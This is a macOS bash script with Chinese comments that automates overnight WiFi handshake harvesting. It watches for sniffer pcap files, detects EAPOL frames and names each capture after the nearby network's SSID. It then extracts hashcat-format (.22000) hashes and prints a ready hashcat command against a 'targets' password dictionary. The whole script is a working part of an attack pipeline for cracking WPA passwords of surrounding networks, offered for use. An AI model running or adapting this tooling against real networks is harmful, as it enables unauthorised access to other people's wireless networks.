#!/bin/bash
# ============================================================
# Sniffer 自动监控脚本
# 后台监控 /var/tmp/ 目录，发现新pcap自动分析+保存+清理
#
# 工作模式：
#   1. 你手动打开 Wireless Diagnostics → Sniffer → 开始
#   2. 运行此脚本，它会在后台持续监控
#   3. 每次你点"停止"时Sniffer写出pcap，脚本立刻检测到
#   4. 自动分析(帧统计+EAPOL检测) → 用WiFi名保存 → 清理/var/tmp/
#   5. 你再点"开始"继续下一轮（相当于手动分片）
#
# 一晚上的策略：
#   每30分钟手动点一次"停止→开始"（或用 auto_sniffer.sh 自动化）
#   脚本会自动处理每个分片，文件不会无限膨胀
#
# 用法: bash auto_watch.sh
# 停止: Ctrl+C
#
# 作者：传康Kk (微信:1837620622)
# ============================================================

# 确保homebrew路径在PATH中（bash运行时可能缺失）
export PATH="/opt/homebrew/bin:/opt/homebrew/sbin:$PATH"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SAVE_DIR="${SCRIPT_DIR}/抓包结果"
WATCH_DIR="/var/tmp"
POLL_INTERVAL=5

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# 已处理过的文件记录
PROCESSED_LIST="${SAVE_DIR}/.processed"

mkdir -p "$SAVE_DIR"
touch "$PROCESSED_LIST"

# ============================================================
# 检查依赖
# ============================================================
for cmd in tcpdump hcxpcapngtool; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo -e "${RED}[!] 缺少: $cmd${NC}"
        exit 1
    fi
done

# ============================================================
# 分析并保存单个pcap
# ============================================================
process_pcap() {
    local pcap="$1"
    local basename_f
    basename_f=$(basename "$pcap")

    # 检查是否已处理过
    if grep -qF "$basename_f" "$PROCESSED_LIST" 2>/dev/null; then
        return
    fi

    # 等文件写完（Sniffer可能还在写）
    local prev_size=0
    local curr_size
    for _ in 1 2 3; do
        curr_size=$(stat -f%z "$pcap" 2>/dev/null || echo 0)
        if [ "$curr_size" -eq "$prev_size" ] && [ "$curr_size" -gt 0 ]; then
            break
        fi
        prev_size=$curr_size
        sleep 1
    done

    # 跳过空文件或太小的文件
    if [ "$curr_size" -lt 100 ]; then
        echo -e "  ${YELLOW}跳过空文件: $basename_f${NC}"
        echo "$basename_f" >> "$PROCESSED_LIST"
        rm -f "$pcap"
        return
    fi

    local size_h
    size_h=$(ls -lh "$pcap" | awk '{print $5}')
    echo ""
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}  发现新pcap: ${basename_f} (${size_h})${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 帧统计
    local total eapol
    total=$(tcpdump -r "$pcap" 2>/dev/null | wc -l | tr -d ' ')
    eapol=$(tcpdump -r "$pcap" 'ether proto 0x888e' 2>/dev/null | wc -l | tr -d ' ')

    echo -e "  总帧: ${total} | EAPOL: ${eapol}"

    # 提取频道
    local channel="unknown"
    if echo "$basename_f" | grep -q '_ch'; then
        channel=$(echo "$basename_f" | sed 's/.*_ch\([0-9]*\).*/\1/')
    fi

    # 提取前3个SSID（按beacon频率排序）
    local ssid_name
    ssid_name=$(tcpdump -r "$pcap" 'type mgt subtype beacon' -e 2>/dev/null \
        | sed -n 's/.*Beacon (\([^)]*\)).*/\1/p' \
        | grep -v '^$' | sort | uniq -c | sort -rn | head -3 \
        | awk '{print $2}' | tr '\n' '_' | sed 's/_$//')
    [ -z "$ssid_name" ] && ssid_name="ch${channel}"
    # 安全文件名
    ssid_name=$(echo "$ssid_name" | tr '/:*?"<>|' '-' | head -c 40)

    # 保存文件名：WiFi名_频道_时间戳
    local ts
    ts=$(date +%H%M%S)
    local dest_name="${ssid_name}_ch${channel}_${ts}"

    if [ "$eapol" -gt 0 ]; then
        # 有EAPOL帧 → 重要文件，保留pcap + 转换.22000
        echo -e "  ${GREEN}✓✓✓ 发现 ${eapol} 个EAPOL帧！${NC}"

        local dest_pcap="${SAVE_DIR}/${dest_name}.pcap"
        cp "$pcap" "$dest_pcap"

        local hashfile="${SAVE_DIR}/${dest_name}.22000"
        hcxpcapngtool -o "$hashfile" "$pcap" 2>/dev/null

        if [ -s "$hashfile" ]; then
            local hcount
            hcount=$(wc -l < "$hashfile" | tr -d ' ')
            echo -e "  ${GREEN}✓ 提取 ${hcount} 条哈希 → ${dest_name}.22000${NC}"
            echo -e "  ${YELLOW}破解: hashcat -m 22000 '${hashfile}' ../针对性密码本/dict_ALL_TARGETS.txt${NC}"
        else
            rm -f "$hashfile"
            echo -e "  ${YELLOW}hcxpcapngtool未提取到有效哈希，pcap已保留供手动分析${NC}"
        fi
        echo -e "  ${CYAN}已保存: ${dest_pcap}${NC}"
    else
        # 无EAPOL → 只保留很小的摘要，丢弃大文件
        echo -e "  ${YELLOW}无EAPOL帧（无人认证）→ 丢弃原始pcap，只保留日志${NC}"

        # 写一行日志记录
        local log="${SAVE_DIR}/capture_log.txt"
        echo "[$(date)] ch${channel} | ${size_h} | ${total}帧 | EAPOL=${eapol} | SSID: ${ssid_name}" >> "$log"
    fi

    # 清理 /var/tmp/ 中的源文件
    rm -f "$pcap"
    echo -e "  ${CYAN}已清理: /var/tmp/${basename_f}${NC}"

    # 记录已处理
    echo "$basename_f" >> "$PROCESSED_LIST"
}

# ============================================================
# 主循环
# ============================================================
main() {
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║  Sniffer 自动监控 (后台运行，Ctrl+C 停止)               ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║                                                        ║${NC}"
    echo -e "${GREEN}║  操作步骤:                                              ║${NC}"
    echo -e "${GREEN}║  1. 按住Option → WiFi图标 → 打开无线诊断               ║${NC}"
    echo -e "${GREEN}║  2. 菜单 → 窗口 → 嗅探器                               ║${NC}"
    echo -e "${GREEN}║  3. 选频道 → 开始                                       ║${NC}"
    echo -e "${GREEN}║  4. 本脚本自动监控: 停止时自动处理+清理                 ║${NC}"
    echo -e "${GREEN}║                                                        ║${NC}"
    echo -e "${GREEN}║  一晚上策略: 每30分钟点一次 停止→开始（分片）           ║${NC}"
    echo -e "${GREEN}║  有EAPOL → 自动保存pcap+提取.22000                     ║${NC}"
    echo -e "${GREEN}║  无EAPOL → 只记日志，自动删除大文件                    ║${NC}"
    echo -e "${GREEN}║                                                        ║${NC}"
    echo -e "${GREEN}║  文件大小预估:                                          ║${NC}"
    echo -e "${GREEN}║    30分钟/次 ≈ 50-100MB → 脚本自动清理无用的           ║${NC}"
    echo -e "${GREEN}║    最终只保留有EAPOL的pcap（通常几MB）                  ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  监控目录: ${CYAN}${WATCH_DIR}/*.pcap${NC}"
    echo -e "  保存目录: ${CYAN}${SAVE_DIR}${NC}"
    echo -e "  轮询间隔: ${POLL_INTERVAL}秒"
    echo ""

    # 先清理已有的旧pcap
    local old_count
    old_count=$(ls "${WATCH_DIR}"/*.pcap 2>/dev/null | wc -l | tr -d ' ')
    if [ "$old_count" -gt 0 ]; then
        echo -e "${YELLOW}  清理 ${WATCH_DIR} 中 ${old_count} 个旧pcap...${NC}"
        rm -f "${WATCH_DIR}"/*.pcap 2>/dev/null
        echo -e "${GREEN}  已清理${NC}"
    fi

    echo -e "\n${CYAN}  等待Sniffer生成新pcap...${NC}\n"

    local round=0
    while true; do
        # 扫描 /var/tmp/ 下的pcap文件
        for f in "${WATCH_DIR}"/*.pcap; do
            [ -f "$f" ] || continue
            process_pcap "$f"
        done

        # 每60秒打印一次心跳
        round=$((round + 1))
        if [ $((round % (60 / POLL_INTERVAL) )) -eq 0 ]; then
            local mins=$((round * POLL_INTERVAL / 60))
            local saved
            saved=$(ls "${SAVE_DIR}"/*.pcap 2>/dev/null | wc -l | tr -d ' ')
            echo -e "\r  ${CYAN}[${mins}分钟] 监控中... 已保存${saved}个有效抓包${NC}"
        fi

        sleep "$POLL_INTERVAL"
    done
}

main "$@"
